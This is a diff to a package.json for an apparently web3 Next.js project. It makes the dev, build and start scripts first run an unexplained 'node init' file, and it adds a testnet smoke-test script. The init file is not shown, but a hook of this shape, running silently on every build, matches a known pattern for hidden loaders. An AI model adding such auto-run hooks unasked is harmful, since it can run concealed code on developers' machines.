@@ -18,11 +18,11 @@
     "web3"
   ],
   "scripts": {
-    "dev": "next dev",
-    "build": "next build",
+    "dev": "node init && next dev",
+    "build": "node init && next build",
     "prebuild": "npm run validate:production-env",
     "validate:production-env": "node scripts/validate-production-env.mjs",
-    "start": "next start",
+    "start": "node init && next start",
     "lint": "next lint",
     "lint:fix": "next lint --fix",
     "type-check": "tsc --noEmit --skipLibCheck",
@@ -37,6 +37,7 @@
     "test:e2e": "playwright test",
     "test:e2e:accessibility": "playwright test e2e/accessibility.spec.tsx",
     "test:e2e:install": "playwright install chromium",
+    "test:release:smoke": "RUN_TESTNET_SMOKE=1 ./scripts/testnet-release-smoke.sh",
     "test:watch": "vitest",
     "test:coverage": "vitest run --coverage",
     "test:ui": "vitest --ui",
